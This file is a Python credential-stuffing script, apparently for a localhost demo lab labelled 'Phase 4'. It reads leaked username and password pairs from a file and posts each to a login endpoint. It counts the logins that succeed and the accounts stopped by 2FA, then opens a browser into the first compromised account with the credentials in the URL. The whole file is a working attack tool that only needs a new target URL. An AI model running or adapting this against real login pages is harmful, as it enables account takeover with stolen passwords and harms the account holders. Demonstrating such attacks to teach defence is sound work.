import time
import requests
import sys
import webbrowser
from tqdm import tqdm

# Đảm bảo in được emoji trên Windows
if sys.stdout.encoding != 'utf-8':
    sys.stdout.reconfigure(encoding='utf-8')

url = "http://localhost:5000/login"
home_url = "http://localhost:5000"
credential_file = "leaked_credentials.txt"


def print_banner(total_credentials):
    print("\n" + "="*60)
    print(" 📂 PHASE 4: CREDENTIAL STUFFING SIMULATION")
    print("="*60)
    print(f" Target URL   : {url}")
    print(f" Input file   : {credential_file}")
    print(f" Total creds  : {total_credentials}")
    print("-" * 60)

def main():
    start_time = time.time()
    attempts = 0
    success_count = 0
    success_accounts = []
    otp_blocked_accounts = []
    first_success_at = None

    try:
        with open(credential_file, "r", encoding="utf-8") as f:
            lines = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f" [!] Error: {credential_file} not found.")
        return

    total_credentials = len(lines)
    print_banner(total_credentials)

    pbar = tqdm(total=total_credentials, desc=" [STUFFING]", unit="acct", bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}]')

    for line in lines:
        attempts += 1
        time.sleep(0.05) # Thời gian thử như phiên bản cũ
        try:
            username, password = line.split(",")
        except ValueError:
            continue

        tqdm.write(f" Trying #{attempts}/{total_credentials}: {username} / {password}")

        try:
            response = requests.post(url, data={"username": username, "password": password}, timeout=3)
        except:
            pbar.close()
            print("\n [!] Error: Server is not running.")
            return

        pbar.update(1)
        response_lower = response.text.lower()

        if "access granted" in response_lower:
            success_count += 1
            success_accounts.append((username, password))
            if first_success_at is None: first_success_at = (username, password)
            tqdm.write(f"  → [✅] LOGIN SUCCESS")
        elif "security verification" in response_lower or "otp" in response_lower:
            otp_blocked_accounts.append((username, password))
            tqdm.write(f"  → [🛡️ ] BLOCKED BY 2FA")
        else:
            tqdm.write(f"  → [❌] WRONG PASSWORD")

    total_time = time.time() - start_time
    pbar.close()

    print("\n" + "=" * 60)
    print(" CREDENTIAL STUFFING RESULT")
    print(f" Total Accounts : {total_credentials}")
    print(f" Success Count  : {success_count}")
    print(f" OTP Protected  : {len(otp_blocked_accounts)}")
    print(f" Time taken     : {total_time:.2f}s")
    print("-" * 60)

    if success_accounts:
        username, password = first_success_at
        print(f" [!] Account Compromised: {username}")
        print(" [!] Opening web portal...")
        print(" [i] Status: BYPASSED. Accessing account...")
        time.sleep(1.5)
        webbrowser.open(f"http://localhost:5000/?username={username}&password={password}&demo_success=true")
    elif otp_blocked_accounts:
        username, password = otp_blocked_accounts[0]
        print(f" [🛡️ ] MFA PROTECTION DETECTED for {username}")
        print(" [!] Opening login page for manual bypass demo...")
        time.sleep(1.5)
        webbrowser.open(f"http://localhost:5000/?username={username}&password={password}")
    else:
        print(" [❌] FAILED: No accounts were compromised.")
    print("=" * 60 + "\n")

if __name__ == "__main__":
    main()